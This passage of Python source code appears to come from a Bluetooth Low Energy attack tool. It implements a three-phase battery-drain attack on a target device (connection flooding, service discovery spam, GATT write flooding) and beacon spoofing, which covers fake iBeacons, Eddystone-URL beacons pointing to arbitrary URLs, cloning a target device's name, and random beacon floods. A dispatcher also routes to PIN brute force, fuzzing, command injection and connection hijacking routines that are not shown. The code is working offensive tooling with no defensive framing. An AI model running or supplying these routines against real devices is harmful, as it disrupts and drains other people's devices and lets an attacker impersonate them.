    async def battery_drain_attack(self, target_mac: str):
        """Battery Drain Attack with live stats per phase"""
        self.log(f"[BLE ATTACK] Starting Battery Drain Attack on {target_mac}...")
        self.state["attack_running"] = True

        start_time = time.time()
        connection_count = 0
        spam_count = 0

        def update_state(phase_name, phase_num):
            elapsed = int(time.time() - start_time)
            conn_rate = round(connection_count / max(elapsed, 1), 1)
            ops_rate = round(spam_count / max(elapsed, 1), 1)
            self.state["attack_result"] = {
                "status": "running",
                "attack_type": "battery_drain",
                "target": target_mac,
                "phase": phase_name,
                "phase_number": phase_num,
                "connections": connection_count,
                "spam_count": spam_count,
                "duration": elapsed,
                "connections_per_sec": conn_rate,
                "operations_per_sec": ops_rate,
                "estimated_drain": f"~{spam_count + connection_count} radio operations",
                "message": f"Phase {phase_num}/3: {phase_name} | {conn_rate} conn/s, {ops_rate} ops/s"
            }

        update_state("Starting", 0)

        try:
            self.log("[BLE ATTACK] Mode: AGGRESSIVE - Connection flood + notification spam")

            # Phase 1: Connection Flooding (30 seconds)
            self.log("[BLE ATTACK] Phase 1/3: Connection Flooding...")
            flood_start = time.time()
            while time.time() - flood_start < 30 and self.state.get("attack_running"):
                try:
                    async with BleakClient(target_mac, timeout=5.0) as client:
                        connection_count += 1
                        self.log(f"[BLE ATTACK] Connection #{connection_count} established")
                        update_state("Connection Flooding", 1)
                        await asyncio.sleep(2)
                except Exception as e:
                    self.log(f"[BLE ATTACK] Connection attempt failed: {str(e)[:50]}")
                    await asyncio.sleep(0.5)
                update_state("Connection Flooding", 1)

            if not self.state.get("attack_running"):
                update_state("Stopped", 1)
                self.state["attack_result"]["status"] = "stopped"
                self.state["attack_result"]["message"] = f"Stopped in Phase 1. {connection_count} connections."
                return

            # Phase 2: Service Discovery Spam (30 seconds)
            self.log("[BLE ATTACK] Phase 2/3: Service Discovery Spam...")
            spam_start = time.time()
            while time.time() - spam_start < 30 and self.state.get("attack_running"):
                try:
                    async with BleakClient(target_mac, timeout=5.0) as client:
                        for _ in range(10):
                            if not self.state.get("attack_running"):
                                break
                            await client.get_services()
                            spam_count += 1
                        self.log(f"[BLE ATTACK] Service discovery spam count: {spam_count}")
                except Exception:
                    await asyncio.sleep(0.5)
                update_state("Service Discovery Spam", 2)

            if not self.state.get("attack_running"):
                update_state("Stopped", 2)
                self.state["attack_result"]["status"] = "stopped"
                self.state["attack_result"]["message"] = f"Stopped in Phase 2. {spam_count} operations."
                return

            # Phase 3: GATT Write Flooding (until stopped)
            self.log("[BLE ATTACK] Phase 3/3: GATT Write Flooding...")
            while self.state.get("attack_running"):
                try:
                    async with BleakClient(target_mac, timeout=5.0) as client:
                        services = await client.get_services()
                        for service in services:
                            for char in service.characteristics:
                                if "write" in char.properties or "write-without-response" in char.properties:
                                    try:
                                        for i in range(50):
                                            if not self.state.get("attack_running"):
                                                break
                                            await client.write_gatt_char(char.uuid, b"\xFF" * 20, response=False)
                                            spam_count += 1
                                        self.log(f"[BLE ATTACK] Write flooding: {spam_count} operations")
                                    except Exception:
                                        pass
                        update_state("GATT Write Flooding", 3)
                except Exception:
                    await asyncio.sleep(1)
                update_state("GATT Write Flooding", 3)

            duration = int(time.time() - start_time)
            conn_rate = round(connection_count / max(duration, 1), 1)
            ops_rate = round(spam_count / max(duration, 1), 1)
            self.state["attack_result"] = {
                "status": "completed",
                "attack_type": "battery_drain",
                "target": target_mac,
                "message": f"Battery drain completed. {duration}s, {connection_count} connections, {spam_count} operations",
                "connections": connection_count,
                "spam_count": spam_count,
                "duration": duration,
                "connections_per_sec": conn_rate,
                "operations_per_sec": ops_rate,
                "estimated_drain": f"~{spam_count + connection_count} radio operations"
            }

            self.log(f"[BLE ATTACK] Battery drain completed")
            self.log(f"[BLE ATTACK] Stats: {connection_count} connections, {spam_count} operations, {duration}s")

        except Exception as e:
            self.log(f"[BLE ATTACK] Battery drain attack failed: {str(e)}")
            self.state["attack_result"] = {
                "status": "failed",
                "message": f"Attack failed: {str(e)}"
            }
        finally:
            self.state["attack_running"] = False

    # ------------------------------------------------------------------
    # Attack 7: Beacon Spoof
    # ------------------------------------------------------------------
    async def beacon_spoof(self):
        """Dispatch beacon spoof based on selected mode"""
        options = self.state.get("attack_options", {})
        mode = options.get("mode", "ibeacon")

        self.log(f"[BLE ATTACK] Starting Beacon Spoof (mode: {mode})")
        self.state["attack_running"] = True

        # Check HCI adapter
        if not self._hci_check():
            self.log("[BLE ATTACK] No Bluetooth adapter found (hci0)")
            self.state["attack_result"] = {
                "status": "failed",
                "message": "No Bluetooth adapter (hci0) found. Check: hciconfig"
            }
            self.state["attack_running"] = False
            return

        try:
            if mode == "ibeacon":
                await self._spoof_ibeacon(options)
            elif mode == "eddystone_url":
                await self._spoof_eddystone(options)
            elif mode == "name_clone":
                await self._spoof_name_clone(options)
            elif mode == "flood":
                await self._spoof_flood(options)
            else:
                self.state["attack_result"] = {
                    "status": "failed",
                    "message": f"Unknown beacon spoof mode: {mode}"
                }
        except Exception as e:
            self.log(f"[BLE ATTACK] Beacon spoof failed: {str(e)}")
            self.state["attack_result"] = {
                "status": "failed",
                "message": f"Beacon spoof failed: {str(e)}"
            }
        finally:
            self._hci_disable_adv()
            self.state["attack_running"] = False

    async def _spoof_ibeacon(self, options):
        """Broadcast fake iBeacon"""
        beacon_uuid = options.get("uuid") or str(uuid_lib.uuid4())
        major = int(options.get("major", 1))
        minor = int(options.get("minor", 1))
        tx_power = int(options.get("tx_power", -59))

        self.log(f"[BLE ATTACK] iBeacon: UUID={beacon_uuid} Major={major} Minor={minor} TX={tx_power}")

        adv_data = self._build_ibeacon(beacon_uuid, major, minor, tx_power)
        if not self._hci_set_adv_data(adv_data):
            self.state["attack_result"] = {"status": "failed", "message": "Failed to set advertising data"}
            return
        if not self._hci_enable_adv():
            self.state["attack_result"] = {"status": "failed", "message": "Failed to enable advertising"}
            return

        self.log("[BLE ATTACK] iBeacon broadcasting...")
        start_time = time.time()
        beacon_count = 0

        while self.state["attack_running"]:
            beacon_count += 1
            elapsed = int(time.time() - start_time)
            self.state["attack_result"] = {
                "status": "running",
                "mode": "ibeacon",
                "uuid": beacon_uuid,
                "major": major,
                "minor": minor,
                "beacon_count": beacon_count,
                "duration": elapsed,
                "message": f"Broadcasting iBeacon ({elapsed}s)"
            }
            await asyncio.sleep(1)

        elapsed = int(time.time() - start_time)
        self.log(f"[BLE ATTACK] iBeacon stopped. {elapsed}s broadcast.")
        self.state["attack_result"] = {
            "status": "stopped",
            "mode": "ibeacon",
            "uuid": beacon_uuid,
            "major": major,
            "minor": minor,
            "beacon_count": beacon_count,
            "duration": elapsed,
            "message": f"iBeacon broadcast stopped after {elapsed}s"
        }

    async def _spoof_eddystone(self, options):
        """Broadcast fake Eddystone-URL beacon"""
        url = options.get("url", "https://example.com")

        self.log(f"[BLE ATTACK] Eddystone-URL: {url}")

        try:
            adv_data = self._build_eddystone_url(url)
        except Exception as e:
            self.state["attack_result"] = {"status": "failed", "message": f"Invalid URL: {str(e)}"}
            return

        if len(adv_data) > 31:
            self.state["attack_result"] = {"status": "failed", "message": "URL too long for Eddystone-URL (max 17 encoded bytes)"}
            return

        if not self._hci_set_adv_data(adv_data):
            self.state["attack_result"] = {"status": "failed", "message": "Failed to set advertising data"}
            return
        if not self._hci_enable_adv():
            self.state["attack_result"] = {"status": "failed", "message": "Failed to enable advertising"}
            return

        self.log("[BLE ATTACK] Eddystone-URL broadcasting...")
        start_time = time.time()
        beacon_count = 0

        while self.state["attack_running"]:
            beacon_count += 1
            elapsed = int(time.time() - start_time)
            self.state["attack_result"] = {
                "status": "running",
                "mode": "eddystone_url",
                "url": url,
                "beacon_count": beacon_count,
                "duration": elapsed,
                "message": f"Broadcasting Eddystone-URL ({elapsed}s)"
            }
            await asyncio.sleep(1)

        elapsed = int(time.time() - start_time)
        self.log(f"[BLE ATTACK] Eddystone-URL stopped. {elapsed}s broadcast.")
        self.state["attack_result"] = {
            "status": "stopped",
            "mode": "eddystone_url",
            "url": url,
            "beacon_count": beacon_count,
            "duration": elapsed,
            "message": f"Eddystone-URL broadcast stopped after {elapsed}s"
        }

    async def _spoof_name_clone(self, options):
        """Clone a device's name and broadcast as fake beacon"""
        target_mac = self.state.get("attack_target")
        if not target_mac:
            self.state["attack_result"] = {"status": "failed", "message": "Target MAC required for Name Clone"}
            return

        self.log(f"[BLE ATTACK] Name Clone: scanning for {target_mac}...")
        self.state["attack_result"] = {
            "status": "running",
            "mode": "name_clone",
            "message": f"Scanning for device {target_mac}..."
        }

        # Phase 1: Read device name via bleak
        device_name = None
        try:
            devices = await BleakScanner.discover(timeout=10.0)
            for d in devices:
                if d.address.lower() == target_mac.lower():
                    device_name = d.name
                    break
        except Exception as e:
            self.log(f"[BLE ATTACK] Scan error: {str(e)}")

        if not device_name:
            self.state["attack_result"] = {
                "status": "failed",
                "mode": "name_clone",
                "message": f"Could not find device name for {target_mac}"
            }
            return

        if not self.state["attack_running"]:
            return

        # Phase 2: Broadcast cloned name
        self.log(f"[BLE ATTACK] Cloned name: '{device_name}'. Broadcasting...")
        adv_data = self._build_name_adv(device_name)
        if not self._hci_set_adv_data(adv_data):
            self.state["attack_result"] = {"status": "failed", "message": "Failed to set advertising data"}
            return
        if not self._hci_enable_adv():
            self.state["attack_result"] = {"status": "failed", "message": "Failed to enable advertising"}
            return

        start_time = time.time()
        beacon_count = 0

        while self.state["attack_running"]:
            beacon_count += 1
            elapsed = int(time.time() - start_time)
            self.state["attack_result"] = {
                "status": "running",
                "mode": "name_clone",
                "cloned_name": device_name,
                "target": target_mac,
                "beacon_count": beacon_count,
                "duration": elapsed,
                "message": f"Broadcasting as '{device_name}' ({elapsed}s)"
            }
            await asyncio.sleep(1)

        elapsed = int(time.time() - start_time)
        self.log(f"[BLE ATTACK] Name Clone stopped. Broadcast as '{device_name}' for {elapsed}s.")
        self.state["attack_result"] = {
            "status": "stopped",
            "mode": "name_clone",
            "cloned_name": device_name,
            "target": target_mac,
            "beacon_count": beacon_count,
            "duration": elapsed,
            "message": f"Name Clone stopped after {elapsed}s"
        }

    async def _spoof_flood(self, options):
        """Flood with random beacon advertisements"""
        count = int(options.get("count", 100))

        self.log(f"[BLE ATTACK] BLE Flood: {count} unique beacons")
        self.state["attack_result"] = {
            "status": "running",
            "mode": "flood",
            "beacon_count": 0,
            "message": "Generating flood payloads..."
        }

        # Pre-generate random payloads
        payloads = []
        for _ in range(count):
            uid = str(uuid_lib.uuid4())
            major = random.randint(0, 65535)
            minor = random.randint(0, 65535)
            payloads.append(self._build_ibeacon(uid, major, minor, -59))

        self.log(f"[BLE ATTACK] {count} payloads generated. Flooding...")
        start_time = time.time()
        beacon_count = 0

        while self.state["attack_running"]:
            for payload in payloads:
                if not self.state["attack_running"]:
                    break
                self._hci_set_adv_data(payload)
                self._hci_enable_adv()
                beacon_count += 1
                elapsed = int(time.time() - start_time)
                rate = round(beacon_count / max(elapsed, 1), 1)
                self.state["attack_result"] = {
                    "status": "running",
                    "mode": "flood",
                    "beacon_count": beacon_count,
                    "duration": elapsed,
                    "beacons_per_second": rate,
                    "unique_beacons": count,
                    "message": f"Flooding: {beacon_count} beacons ({rate}/s)"
                }
                await asyncio.sleep(0.05)
                self._hci_disable_adv()

        elapsed = int(time.time() - start_time)
        rate = round(beacon_count / max(elapsed, 1), 1)
        self.log(f"[BLE ATTACK] Flood stopped. {beacon_count} beacons in {elapsed}s ({rate}/s)")
        self.state["attack_result"] = {
            "status": "stopped",
            "mode": "flood",
            "beacon_count": beacon_count,
            "duration": elapsed,
            "beacons_per_second": rate,
            "unique_beacons": count,
            "message": f"Flood stopped: {beacon_count} beacons in {elapsed}s ({rate}/s)"
        }

    # ------------------------------------------------------------------
    # Control
    # ------------------------------------------------------------------
    async def stop_attack(self):
        """Stop current attack"""
        self.state["attack_running"] = False
        # Cleanup beacon advertising if running
        try:
            subprocess.run(["hciconfig", "hci0", "noleadv"], capture_output=True, timeout=5)
        except Exception:
            pass
        print("[BLE ATTACK] Stopping attack...")

    async def run_loop(self):
        """Main attack loop"""
        print("[BLE ATTACK] Attack service started")
        while True:
            try:
                if self.state.get("attack_running") and self.state.get("attack_type"):
                    attack_type = self.state["attack_type"]
                    target = self.state.get("attack_target")

                    if attack_type == "auto_connect":
                        await self.auto_connect_vulnerable()
                    elif attack_type == "pin_bruteforce" and target:
                        await self.brute_force_pin(target)
                    elif attack_type == "fuzzing" and target:
                        await self.characteristic_fuzzing(target)
                    elif attack_type == "command_injection" and target:
                        await self.command_injection_test(target)
                    elif attack_type == "hijacking" and target:
                        await self.hijack_connection(target)
                    elif attack_type == "battery_drain" and target:
                        await self.battery_drain_attack(target)
                    elif attack_type == "beacon_spoof":
                        await self.beacon_spoof()

                    # Clear attack type after execution
                    self.state["attack_type"] = None

                await asyncio.sleep(0.5)

            except Exception as e:
                print(f"[BLE ATTACK] Loop error: {e}")
                await asyncio.sleep(1)
